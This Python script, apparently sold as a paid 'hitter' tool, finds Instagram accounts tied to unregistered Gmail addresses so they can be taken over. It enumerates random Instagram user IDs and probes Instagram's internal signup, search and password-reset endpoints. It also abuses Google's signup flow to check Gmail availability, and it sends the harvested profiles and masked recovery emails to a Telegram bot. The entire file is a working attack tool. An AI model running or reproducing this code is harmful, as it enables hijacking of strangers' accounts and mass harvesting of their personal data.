import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor

try:
    from user_agent import generate_user_agent
except ImportError:
    def generate_user_agent():
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        ]
        return random.choice(uas)

try:
    from cfonts import render as cfonts_render
except ImportError:
    def cfonts_render(text, **kwargs):
        return f"\n  === {text} ===\n"

MIN_FOLLOWERS = 0
THREADS = 80

ACCESS_LIST_URL = "https://raw.githubusercontent.com/starop6969/XYZ/refs/heads/main/expiry.txt"

IST_OFFSET = timedelta(hours=5, minutes=30)

GOLD = '\x1b[38;5;220m'
CYAN = '\x1b[38;5;51m'
PINK = '\x1b[38;5;213m'
GREEN = '\x1b[38;5;120m'
RED = '\x1b[38;5;196m'
YELLOW = '\x1b[38;5;226m'
WHITE = '\x1b[1;37m'
DIM = '\x1b[2;37m'
RESET = '\033[0m'
BOLD = '\x1b[1m'
UNDERLINE = '\x1b[4m'

def check_telegram_access(user_id):
    try:
        response = requests.get(ACCESS_LIST_URL, timeout=15)
        if response.status_code != 200:
            print(f"{RED}⚠️ Access list fetch fail (status {response.status_code}){RESET}")
            return False

        lines = response.text.strip().splitlines()
        for line in lines:
            line = line.strip()
            if not line or "," not in line or ":" not in line:
                continue

            parts = line.split(",")
            if len(parts) < 2:
                continue

            uid = parts[0].strip()
            date_part = parts[1].strip()

            try:
                expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
            except ValueError:
                continue

            if uid == str(user_id):
                now_ist = datetime.now(timezone.utc) + IST_OFFSET
                remaining = expiry_ist - now_ist.replace(tzinfo=None)

                if remaining.total_seconds() > 0:
                    days, seconds = divmod(int(remaining.total_seconds()), 86400)
                    hours, seconds = divmod(seconds, 3600)
                    minutes, _ = divmod(seconds, 60)
                    print(f"{GREEN}✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃{RESET}")
                    print(f"{YELLOW}⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days}d {hours}h {minutes}m{RESET}")
                    return True
                else:
                    print(f"{RED}⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: Premium expired.{RESET}")
                    return False

        print(f"{RED}⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: Not Premium{RESET}")
        return False

    except Exception as e:
        print(f"{RED}⚠️ Access check error: {e}{RESET}")
        return False

logo = cfonts_render('SAM', font='block', colors=['white', 'red', 'yellow'], align='center', space=True)
print('\x1b[1;39m' + '═' * 60)
print(logo)
print('\x1b[1;39m' + '═' * 60)
print(f'{GOLD}🔥 PROFESSIONAL HITTER — MONETIZATION READY 🔥{RESET}')
print('')

chat_id = input(f'{CYAN}𝐈𝐃 𝐃𝐀𝐋  {RESET}').strip()
print('')

if not check_telegram_access(chat_id):
    print(f"{RED}❌ Access Denied. Exiting...{RESET}")
    sys.exit()

print('')
bot_token = input(f'{CYAN}𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐃𝐀𝐋   {RESET}').strip()
print('')
os.system('cls' if os.name == 'nt' else 'clear')

print('\x1b[1;39m' + '═' * 60)
print(cfonts_render('SAM', font='block', colors=['white', 'red', 'yellow'], align='center', space=True))
print('\x1b[1;39m' + '═' * 60)
print(f'{GOLD}𝐒𝐀𝐌𝐆𝐎𝐃 🔱 𝐓𝐎𝐎𝐋𝐒 𝐀𝐂𝐓𝐈𝐕𝐄.....{RESET}')

print(f"\n{YELLOW}🔹 Minimum followers: {MIN_FOLLOWERS}{RESET}")
print(f"{YELLOW}🔹 Threads: {THREADS}{RESET}\n")

hits = 0
good = 0
bad = 0

def display():
    global hits, good, bad
    stats = (f'\r{WHITE}┌────────────────────────────────────────────────┐{RESET}\n'
             f'{WHITE}│{RESET}  {GREEN}🔰 𝐆𝐎𝐎𝐃 : {good}{RESET} │ {YELLOW}𝐇𝐈𝐓𝐒 : {hits}{RESET} │ {RED}𝐁𝐀𝐃 : {bad}{RESET}  {WHITE}│{RESET}\n'
             f'{WHITE}└─────────────────────────────────────────────────┘{RESET}\n')
    sys.stdout.write(stats)
    sys.stdout.flush()

class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "user-agent": generate_user_agent(),
                }
                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers, timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'user-agent': generate_user_agent(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies, headers=headers2, data=data, timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except Exception:
                pass

            try:
                headers = {
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'user-agent': generate_user_agent(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                }
                params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except Exception:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("empty")
                tl, host = line.split('//')
        except Exception:
            time.sleep(3)
            try:
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    tl, host = line.split('//')
            except Exception:
                return 'bad'

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        try:
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params, cookies=cookies, headers=headers, data=data, timeout=10
            )
            if '"gf.uar",1' in response.text:
                return 'good'
            elif '"er",null,null,null,null,400' in response.text:
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except Exception:
            return 'bad'

class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except Exception:
            pass
        return False

    def _check_bloks(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-ig-app-id': "567067343352427",
            'x-ig-android-id': android,
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            return email in resp.text
        except Exception:
            return False

    def _check_web_create(self, email):
        if not self._ensure_tokens():
            return False
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-csrftoken': self.csrf,
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/'
        }
        cookies = {'csrftoken': self.csrf}
        username = 'testuser_' + str(random.randint(1000, 99999))
        data = {'email': email, 'username': username, 'first_name': 'Test', 'password': 'Test@123456'}
        try:
            r = self.session.post(url, headers=headers, cookies=cookies, data=data, timeout=10)
            if r.status_code == 200:
                return 'email' in r.json().get('errors', {})
            return False
        except Exception:
            return False

    def check_email(self, email):
        return self._check_bloks(email) or self._check_web_create(email)

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'origin': 'https://www.instagram.com',
        }
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, timeout=20)
            if response.status_code == 200:
                user = response.json().get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except Exception:
            pass
        return None

class ReportManager:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self._working = True

    def send_telegram(self, msg):
        if not self._working:
            return
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            r = requests.post(url, json={"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}, timeout=15)
            if r.status_code != 200:
                self._working = False
        except Exception:
            self._working = False

    def save_to_file(self, msg, filename='hits.txt'):
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f'{msg}\n')
        except Exception:
            pass

    def _get_monetization_status(self, data):
        followers = data.get('follower_count', 0)
        is_private = data.get('is_private', True)
        return "✅ Eligible" if followers >= 50 and not is_private else "❌ Not Eligible"

    def format_result(self, data):
        username = data.get('username', '')
        full_name = data.get('full_name', '')
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        bio = data.get('biography', '')[:50]
        pk = data.get('pk', 0)
        try:
            pk = int(pk)
            ranges = [
                (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
                (279760001, 900990000, 2013), (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
                (10016232396, 27238602159, 2019), (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023), (63313426938, 70134323896, 2024),
                (70313426938, 78313496938, 2025)
            ]
            year = "2023+"
            for low, high, y in ranges:
                if low <= pk <= high:
                    year = str(y)
                    break
        except Exception:
            year = "Unknown"

        reset_mask = self._fetch_reset_email(username)
        monetization = self._get_monetization_status(data)

        lines = [
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  ✦ SAMGOD 🔱 HIT FOUND ✦",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"  👤 Name       : {full_name}",
            f"  🏷️ Username   : @{username}",
            f"  📧 Email      : {email}",
            f"  🌐 Domain     : {domain}",
            f"  👥 Followers  : {followers:,}",
            f"  🔄 Following  : {following:,}",
            f"  📸 Posts      : {posts}",
            f"  📅 Age        : {year}",
            f"  💬 Bio        : {bio if bio else '-'}",
            f"  🔒 Reset Mask : {reset_mask}",
            f"  💰 Monetization: {monetization}",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"  🔗 Profile    : https://instagram.com/{username}",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "     🚀 Powered by SAMGOD 🔱",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]

        colored = []
        for line in lines:
            if ':' in line and not line.startswith('━') and not line.startswith('  ✦') and not line.startswith('  🔗') and not line.startswith('     🚀'):
                label, value = line.split(':', 1)
                colored.append(f"{BOLD}{CYAN}{label.strip()}{RESET}: {WHITE}{value.strip()}{RESET}")
            elif line.startswith('  ✦'):
                colored.append(f"{GOLD}{line}{RESET}")
            elif line.startswith('  🔗'):
                colored.append(f"{CYAN}{line}{RESET}")
            elif line.startswith('     🚀'):
                colored.append(f"{YELLOW}{line}{RESET}")
            elif line.startswith('━'):
                colored.append(f"{DIM}{line}{RESET}")
            else:
                colored.append(f"{WHITE}{line}{RESET}")

        console_msg = '\n'.join(colored)

        html = []
        for line in lines:
            if ':' in line and not line.startswith('━') and not line.startswith('  ✦') and not line.startswith('  🔗') and not line.startswith('     🚀'):
                label, value = line.split(':', 1)
                html.append(f"<b>{label.strip()}</b>: {value.strip()}")
            elif line.startswith('  ✦'):
                html.append(f"<b>{line}</b>")
            elif line.startswith('     🚀'):
                html.append(f"<i>{line}</i>")
            else:
                html.append(line)
        telegram_msg = '\n'.join(html)

        return console_msg, telegram_msg

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except Exception:
            return "-"

reporter = ReportManager(bot_token, chat_id)
google = GoogleChecker()
insta = InstagramChecker()

def process_user():
    global hits, good, bad
    while True:
        try:
            user_id = random.randint(2500000000, 21254029834)
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            followers = user_data.get('follower_count', 0)
            if followers < MIN_FOLLOWERS:
                time.sleep(random.uniform(0.02, 0.08))
                continue

            email = f"{username}@gmail.com"

            if insta.check_email(email):
                good += 1
                display()

                if google.check_availability(email) == 'good':
                    hits += 1
                    display()

                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': followers,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    console_msg, telegram_msg = reporter.format_result(profile)
                    print('\n' + GOLD + '═' * 60 + RESET)
                    print(console_msg)
                    print(GOLD + '═' * 60 + RESET)

                    plain_msg = re.sub(r'<[^>]+>', '', telegram_msg)
                    reporter.save_to_file(plain_msg)
                    reporter.send_telegram(telegram_msg)
            else:
                bad += 1
                display()

            time.sleep(random.uniform(0.05, 0.15))
        except Exception:
            time.sleep(random.uniform(0.1, 0.2))
            continue

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(process_user)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n' + YELLOW + '◄  SAMGOD 🔱 HITTER  —  SESSION ENDED  ►' + RESET)
